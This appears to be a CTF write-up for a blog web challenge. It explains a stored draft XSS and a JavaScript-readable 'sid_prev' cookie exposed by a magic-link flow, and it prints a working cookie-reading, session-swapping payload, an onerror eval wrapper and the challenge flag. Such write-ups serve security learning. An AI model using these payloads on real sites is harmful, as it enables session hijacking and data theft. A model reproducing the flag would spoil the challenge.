<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# Personal Blog — Writeup

## Summary
The editor view renders draft HTML without sanitization, so a draft XSS is possible.
When a magic link is used, the app stores the previous session cookie in a
non-HttpOnly `sid_prev` cookie. By having the admin bot visit a magic link that
redirects to our edit page, our XSS can read `sid_prev`, swap to the admin
session, fetch `/flag`, then restore our session and save the flag into our own
post.

## Key Bugs
- **Stored XSS in drafts:** `/edit/:id` renders `<%- draftContent %>` directly.
  Drafts are saved via `/api/autosave` without server-side sanitization.
- **Session swap leakage:** `/magic/:token` saves the existing `sid` into
  `sid_prev` with `httpOnly: false`, making it readable by JavaScript.
- **Admin bot:** `/report` makes the admin bot visit a local URL, allowing the
  XSS to execute in the admin session.

## Exploit Chain
1. Register/login and create a new post to get `postId`.
2. Store a draft XSS via `/api/autosave` so it runs on `/edit/<postId>`.
3. Generate a magic link (`/magic/<token>`).
4. Submit to the bot:  
   `http://localhost:3000/magic/<token>?redirect=/edit/<postId>`
5. When the admin visits the link:
   - The app sets `sid_prev=<admin sid>` and `sid=<your sid>`.
   - XSS reads `sid_prev`, swaps `sid` to admin, fetches `/flag`,
     restores `sid`, and saves the flag into your post.
6. View `/post/<postId>` to read the flag.

## Payload (JS logic)
```js
(async () => {
  const cookies = Object.fromEntries(document.cookie.split(';').map(v => v.trim().split('=')));
  const sidPrev = cookies.sid_prev;
  const sidMine = cookies.sid;
  if (!sidPrev || !sidMine) return;
  document.cookie = 'sid=' + sidPrev + '; path=/';
  const flag = await (await fetch('/flag')).text();
  document.cookie = 'sid=' + sidMine + '; path=/';
  await fetch('/api/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ postId: POST_ID, content: flag })
  });
})();
```

Example HTML wrapper for the draft:
```html
<img src=x onerror="eval(atob('<base64-js>'))">
```

## Notes
- The report endpoint only accepts local HTTP URLs; use
  `http://localhost:3000/...` when submitting to the bot.
- If a PoW challenge is shown, solve it and include `pow_challenge` and
  `pow_solution` in the `/report` POST.

## Flag
`uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}`
